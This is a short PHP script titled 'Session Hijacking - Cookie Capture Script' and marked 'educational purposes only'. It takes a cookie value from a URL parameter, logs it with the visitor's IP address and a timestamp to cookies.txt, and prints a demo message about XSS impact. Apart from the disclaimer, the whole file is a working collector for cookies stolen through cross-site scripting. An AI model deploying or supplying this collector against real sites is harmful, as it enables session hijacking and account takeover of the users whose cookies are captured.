<?php
// Session Hijacking - Cookie Capture Script
// Educational purposes only

$cookie = isset($_GET['cookie']) ? $_GET['cookie'] : 'No cookie received';
$ip = $_SERVER['REMOTE_ADDR'];
$time = date('Y-m-d H:i:s');

$log_entry = "Time: $time | IP: $ip | Cookie: $cookie\n";

// Log to file
file_put_contents("cookies.txt", $log_entry, FILE_APPEND);

// Response
header('Content-Type: text/plain');
echo "Educational Demo - Session Hijacking\n";
echo "====================================\n";
echo "Cookie logging simulation complete.\n";
echo "This demonstrates XSS vulnerability impact.\n";
?>